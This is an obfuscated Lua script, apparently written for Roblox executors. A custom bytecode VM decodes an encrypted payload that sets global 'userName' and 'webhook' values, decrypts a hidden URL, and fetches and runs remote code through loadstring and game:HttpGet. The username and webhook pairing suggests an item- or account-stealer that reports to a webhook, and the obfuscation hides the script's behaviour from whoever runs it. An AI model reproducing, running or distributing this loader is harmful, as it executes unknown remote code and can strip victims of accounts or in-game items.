local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 79) then
			repeatNext = StrToNumber(Sub(byte, 1, 1));
			return "";
		else
			local a = Char(StrToNumber(byte, 16));
			if repeatNext then
				local b = Rep(a, repeatNext);
				repeatNext = nil;
				return b;
			else
				return a;
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
			return Res - (Res % 1);
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local a = Byte(ByteString, DIP, DIP);
		DIP = DIP + 1;
		return a;
	end
	local function gBits16()
		local a, b = Byte(ByteString, DIP, DIP + 2);
		DIP = DIP + 2;
		return (b * 256) + a;
	end
	local function gBits32()
		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
		DIP = DIP + 4;
		return (d * 16777216) + (c * 65536) + (b * 256) + a;
	end
	local function gFloat()
		local Left = gBits32();
		local Right = gBits32();
		local IsNormal = 1;
		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
		local Exponent = gBit(Right, 21, 31);
		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
		if (Exponent == 0) then
			if (Mantissa == 0) then
				return Sign * 0;
			else
				Exponent = 1;
				IsNormal = 0;
			end
		elseif (Exponent == 2047) then
			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
		end
		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
	end
	local function gString(Len)
		local Str;
		if not Len then
			Len = gBits32();
			if (Len == 0) then
				return "";
			end
		end
		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
		DIP = DIP + Len;
		local FStr = {};
		for Idx = 1, #Str do
			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
		end
		return Concat(FStr);
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local Instrs = {};
		local Functions = {};
		local Lines = {};
		local Chunk = {Instrs,Functions,nil,Lines};
		local ConstCount = gBits32();
		local Consts = {};
		for Idx = 1, ConstCount do
			local Type = gBits8();
			local Cons;
			if (Type == 1) then
				Cons = gBits8() ~= 0;
			elseif (Type == 2) then
				Cons = gFloat();
			elseif (Type == 3) then
				Cons = gString();
			end
			Consts[Idx] = Cons;
		end
		Chunk[3] = gBits8();
		for Idx = 1, gBits32() do
			local Descriptor = gBits8();
			if (gBit(Descriptor, 1, 1) == 0) then
				local Type = gBit(Descriptor, 2, 3);
				local Mask = gBit(Descriptor, 4, 6);
				local Inst = {gBits16(),gBits16(),nil,nil};
				if (Type == 0) then
					Inst[3] = gBits16();
					Inst[4] = gBits16();
				elseif (Type == 1) then
					Inst[3] = gBits32();
				elseif (Type == 2) then
					Inst[3] = gBits32() - (2 ^ 16);
				elseif (Type == 3) then
					Inst[3] = gBits32() - (2 ^ 16);
					Inst[4] = gBits16();
				end
				if (gBit(Mask, 1, 1) == 1) then
					Inst[2] = Consts[Inst[2]];
				end
				if (gBit(Mask, 2, 2) == 1) then
					Inst[3] = Consts[Inst[3]];
				end
				if (gBit(Mask, 3, 3) == 1) then
					Inst[4] = Consts[Inst[4]];
				end
				Instrs[Idx] = Inst;
			end
		end
		for Idx = 1, gBits32() do
			Functions[Idx - 1] = Deserialize();
		end
		return Chunk;
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local Instr = Instr;
			local Proto = Proto;
			local Params = Params;
			local _R = _R;
			local VIP = 1;
			local Top = -1;
			local Vararg = {};
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local Lupvals = {};
			local Stk = {};
			for Idx = 0, PCount do
				if (Idx >= Params) then
					Vararg[Idx - Params] = Args[Idx + 1];
				else
					Stk[Idx] = Args[Idx + 1];
				end
			end
			local Varargsz = (PCount - Params) + 1;
			local Inst;
			local Enum;
			while true do
				Inst = Instr[VIP];
				Enum = Inst[1];
				if (Enum <= 26) then
					if (Enum <= 12) then
						if (Enum <= 5) then
							if (Enum <= 2) then
								if (Enum <= 0) then
									local A = Inst[2];
									Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
								elseif (Enum == 1) then
									local A = Inst[2];
									local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Top)));
									Top = (Limit + A) - 1;
									local Edx = 0;
									for Idx = A, Top do
										Edx = Edx + 1;
										Stk[Idx] = Results[Edx];
									end
								else
									Stk[Inst[2]] = #Stk[Inst[3]];
								end
							elseif (Enum <= 3) then
								Stk[Inst[2]] = Stk[Inst[3]] % Stk[Inst[4]];
							elseif (Enum > 4) then
								local A = Inst[2];
								local B = Stk[Inst[3]];
								Stk[A + 1] = B;
								Stk[A] = B[Inst[4]];
							else
								Stk[Inst[2]] = Upvalues[Inst[3]];
							end
						elseif (Enum <= 8) then
							if (Enum <= 6) then
								Stk[Inst[2]] = Stk[Inst[3]];
							elseif (Enum > 7) then
								local A = Inst[2];
								do
									return Unpack(Stk, A, Top);
								end
							else
								local A = Inst[2];
								do
									return Stk[A](Unpack(Stk, A + 1, Inst[3]));
								end
							end
						elseif (Enum <= 10) then
							if (Enum > 9) then
								VIP = Inst[3];
							else
								local A = Inst[2];
								do
									return Unpack(Stk, A, Top);
								end
							end
						elseif (Enum == 11) then
							local A = Inst[2];
							local Step = Stk[A + 2];
							local Index = Stk[A] + Step;
							Stk[A] = Index;
							if (Step > 0) then
								if (Index <= Stk[A + 1]) then
									VIP = Inst[3];
									Stk[A + 3] = Index;
								end
							elseif (Index >= Stk[A + 1]) then
								VIP = Inst[3];
								Stk[A + 3] = Index;
							end
						else
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
						end
					elseif (Enum <= 19) then
						if (Enum <= 15) then
							if (Enum <= 13) then
								Stk[Inst[2]] = Inst[3];
							elseif (Enum > 14) then
								if not Stk[Inst[2]] then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							else
								local A = Inst[2];
								Stk[A](Unpack(Stk, A + 1, Top));
							end
						elseif (Enum <= 17) then
							if (Enum == 16) then
								Stk[Inst[2]] = Inst[3] + Stk[Inst[4]];
							else
								Stk[Inst[2]] = Inst[3] + Stk[Inst[4]];
							end
						elseif (Enum > 18) then
							local A = Inst[2];
							local Index = Stk[A];
							local Step = Stk[A + 2];
							if (Step > 0) then
								if (Index > Stk[A + 1]) then
									VIP = Inst[3];
								else
									Stk[A + 3] = Index;
								end
							elseif (Index < Stk[A + 1]) then
								VIP = Inst[3];
							else
								Stk[A + 3] = Index;
							end
						else
							Stk[Inst[2]]();
						end
					elseif (Enum <= 22) then
						if (Enum <= 20) then
							Stk[Inst[2]] = #Stk[Inst[3]];
						elseif (Enum > 21) then
							Stk[Inst[2]]();
						else
							Stk[Inst[2]] = {};
						end
					elseif (Enum <= 24) then
						if (Enum > 23) then
							Stk[Inst[2]] = Stk[Inst[3]] + Inst[4];
						else
							local NewProto = Proto[Inst[3]];
							local NewUvals;
							local Indexes = {};
							NewUvals = Setmetatable({}, {__index=function(_, Key)
								local Val = Indexes[Key];
								return Val[1][Val[2]];
							end,__newindex=function(_, Key, Value)
								local Val = Indexes[Key];
								Val[1][Val[2]] = Value;
							end});
							for Idx = 1, Inst[4] do
								VIP = VIP + 1;
								local Mvm = Instr[VIP];
								if (Mvm[1] == 38) then
									Indexes[Idx - 1] = {Stk,Mvm[3]};
								else
									Indexes[Idx - 1] = {Upvalues,Mvm[3]};
								end
								Lupvals[#Lupvals + 1] = Indexes;
							end
							Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
						end
					elseif (Enum == 25) then
						local A = Inst[2];
						do
							return Stk[A](Unpack(Stk, A + 1, Inst[3]));
						end
					else
						do
							return;
						end
					end
				elseif (Enum <= 39) then
					if (Enum <= 32) then
						if (Enum <= 29) then
							if (Enum <= 27) then
								Stk[Inst[2]] = {};
							elseif (Enum > 28) then
								VIP = Inst[3];
							else
								Stk[Inst[2]] = Stk[Inst[3]] % Inst[4];
							end
						elseif (Enum <= 30) then
							Stk[Inst[2]] = Upvalues[Inst[3]];
						elseif (Enum == 31) then
							Stk[Inst[2]] = Env[Inst[3]];
						else
							local A = Inst[2];
							local B = Stk[Inst[3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
						end
					elseif (Enum <= 35) then
						if (Enum <= 33) then
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Stk[A + 1]));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						elseif (Enum == 34) then
							do
								return;
							end
						else
							Stk[Inst[2]] = Stk[Inst[3]] + Inst[4];
						end
					elseif (Enum <= 37) then
						if (Enum > 36) then
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						else
							Stk[Inst[2]] = Inst[3];
						end
					elseif (Enum > 38) then
						local A = Inst[2];
						local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Top)));
						Top = (Limit + A) - 1;
						local Edx = 0;
						for Idx = A, Top do
							Edx = Edx + 1;
							Stk[Idx] = Results[Edx];
						end
					else
						Stk[Inst[2]] = Stk[Inst[3]];
					end
				elseif (Enum <= 46) then
					if (Enum <= 42) then
						if (Enum <= 40) then
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Stk[A + 1]));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						elseif (Enum > 41) then
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
						else
							local A = Inst[2];
							Stk[A](Unpack(Stk, A + 1, Top));
						end
					elseif (Enum <= 44) then
						if (Enum > 43) then
							local A = Inst[2];
							local Step = Stk[A + 2];
							local Index = Stk[A] + Step;
							Stk[A] = Index;
							if (Step > 0) then
								if (Index <= Stk[A + 1]) then
									VIP = Inst[3];
									Stk[A + 3] = Index;
								end
							elseif (Index >= Stk[A + 1]) then
								VIP = Inst[3];
								Stk[A + 3] = Index;
							end
						else
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						end
					elseif (Enum == 45) then
						local A = Inst[2];
						Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
					else
						Stk[Inst[2]] = Stk[Inst[3]] % Inst[4];
					end
				elseif (Enum <= 49) then
					if (Enum <= 47) then
						Env[Inst[3]] = Stk[Inst[2]];
					elseif (Enum == 48) then
						local A = Inst[2];
						local Index = Stk[A];
						local Step = Stk[A + 2];
						if (Step > 0) then
							if (Index > Stk[A + 1]) then
								VIP = Inst[3];
							else
								Stk[A + 3] = Index;
							end
						elseif (Index < Stk[A + 1]) then
							VIP = Inst[3];
						else
							Stk[A + 3] = Index;
						end
					elseif not Stk[Inst[2]] then
						VIP = VIP + 1;
					else
						VIP = Inst[3];
					end
				elseif (Enum <= 51) then
					if (Enum == 50) then
						Env[Inst[3]] = Stk[Inst[2]];
					else
						Stk[Inst[2]] = Env[Inst[3]];
					end
				elseif (Enum == 52) then
					local NewProto = Proto[Inst[3]];
					local NewUvals;
					local Indexes = {};
					NewUvals = Setmetatable({}, {__index=function(_, Key)
						local Val = Indexes[Key];
						return Val[1][Val[2]];
					end,__newindex=function(_, Key, Value)
						local Val = Indexes[Key];
						Val[1][Val[2]] = Value;
					end});
					for Idx = 1, Inst[4] do
						VIP = VIP + 1;
						local Mvm = Instr[VIP];
						if (Mvm[1] == 38) then
							Indexes[Idx - 1] = {Stk,Mvm[3]};
						else
							Indexes[Idx - 1] = {Upvalues,Mvm[3]};
						end
						Lupvals[#Lupvals + 1] = Indexes;
					end
					Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
				else
					Stk[Inst[2]] = Stk[Inst[3]] % Stk[Inst[4]];
				end
				VIP = VIP + 1;
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
return VMCall("LOL!133O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403083O00757365724E616D6503723O003D6259624A78593D70633D2F66616D517551364966576B4B667D5341546A4A2B227037503976227136383A5B2275363D22243C26225236383756226E3722394C22753649395722473B6A223B3D64222A362A3524222O362C39492258395F22673A2E227B392O227336463C742263363C373103073O00776562682O6F6B03AA042O004269426D56556747757B4A605C2D5A78496E4A69535C674D38774B7E50234B66362C4C2A692D523E396F535B3C527B285F7C3C5F5C2A4B3F3934494F7753705F667B5A2154514A2D6B6C365755242O7D3563484D366B536735733B334B715949507C4B725B73496D5567596E3E3871625667477E4951583D7B2F574C5441552A6852385F387A4B567233587B486E77786A6F763A4D285553384A7841484B69354D2A555F57777C5C736B7D3539705951714B357570354F24483E386B6665506437274D5C52215A73396A667C462C4C273B407922487858683A70522855634673676658286E43553C3A6D4D5550685E286A5E4B233B53753E673D3C784A7B7C397B6246713555665C6A506B3B5D3E6D726864372F5A7C7B376877543D704C487C796047703932795220295025495F727C663235627B7850393D4B4947483074503B295D4A556C6F34226A3E63224A36263C26225A36703B3F226B375E3A452259396622553E31223136433B7D2273373B3A6722313B4322603E62223436453B6F224E372A393B225A37483634226B3B7C22513A272226367B3E3B225036623C6822723736393A2265397B22473750363F22753679356022653D42223736423C212240366A3E24223B36433E44225036613B65224D362F3B252234362B352E222B3652222C372A3565222O36253D76227E3D54225536293833225636433A4A22793C3122363A30222336463E2322443B5022383628364F2273375F3647227E36583A7E225C377A225E375E3534224036323971227336643B6E2261362F3C7B222636313660222D3726357222373857222F3935225F36493D652233363D355B2260363A365722583777354722263E5722603D4E2270362O3A702235373E22573676353E226337242275363A3B2722333D6922543C5B2271376F394822473B7A2268362138532263366D366D2231366D3A6722393C572249362C384A22483E44222936443C6F22793B7122443E5B225D366F374E223937713627224F367C363A223936263A2122733D652221377A3A3922383723382E22603B30226736563547226D36683E43224A3645394E22423621225937763724223F375F375D226036693959225F364F376C225C373B395C2262373D375B2257396D2227396B224237792276376739332273367D36722264362D3824222D3E5D227B3D43223039342273366B3B71223F3C24226E36633D51227D394E224A36403C51225A37403A5E224C3A28227D374A37452256364B373F22263657374C2268365B3878224738212223363C394522333E612236374A2266362E3848223937233A2F223B36793C6E2263362O3724222C3E79225A365C3E2O22423771382D222F36793A74223A3B25224D3D572244377B397C222F37603755224736563855226A3A5E22563D59222C373F3840222E3E242225375736712262364A3C23223C3A2C22753776366F227C2O36387A2253375B225E37563573224D3C3A224B364222393761396D2O2236303C5522543E5B2238367C3D252251373D3665226036393D2B225636443B672277373E384A224B3B59224236413772222F366A3B46226036543637224D3749387E2268374E3A79223D374F37272259362C3C292265377C36742261362O374E225C3B6C22623B6722453D4422403E79030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034A3O00D9D7CF35F5E18851C3C2CC6BE1B2D316C4C1CE36E3A9C411DFD7DE2BF2F5C411DC8CE826F4B2D70AC28EEF20F4B6C21A9EF0D837EFABD30DEEE1DE31E7F4CA1FD8CD9428EBE98912C4C203083O007EB1A3BB4586DBA700264O00157O00121F000100013O00200C00010001000200121F000200013O00200C00020002000300121F000300013O00200C00030003000400121F000400053O00060F0004000B0001000100040A3O000B000100121F000400063O00200C00050004000700121F000600083O00200C00060006000900121F000700083O00200C00070007000A00061700083O000100062O00263O00074O00263O00014O00263O00054O00263O00024O00263O00034O00263O00063O0012240009000C3O0012320009000B3O0012240009000E3O0012320009000D3O00121F0009000F3O00121F000A00103O002O20000A000A00112O0006000C00083O001224000D00123O001224000E00134O002B000C000E4O0001000A8O00093O00022O00160009000100012O00223O00013O00013O00023O00026O00F03F026O00704002264O001500025O001224000300014O001400045O001224000500013O0004130003002100012O000400076O0006000800024O0004000900014O0004000A00024O0004000B00034O0004000C00044O0006000D6O0006000E00063O002018000F000600012O002B000C000F6O000B3O00022O0004000C00034O0004000D00044O0006000E00014O0014000F00014O0003000F0006000F002O10000F0001000F2O0014001000014O0003001000060010002O100010000100100020180010001000012O002B000D00104O0001000C8O000A3O000200202E000A000A00022O00280009000A4O000E00073O000100042C0003000500012O0004000300054O0006000400024O0007000300044O000800036O00223O00017O00", GetFEnv(), ...);
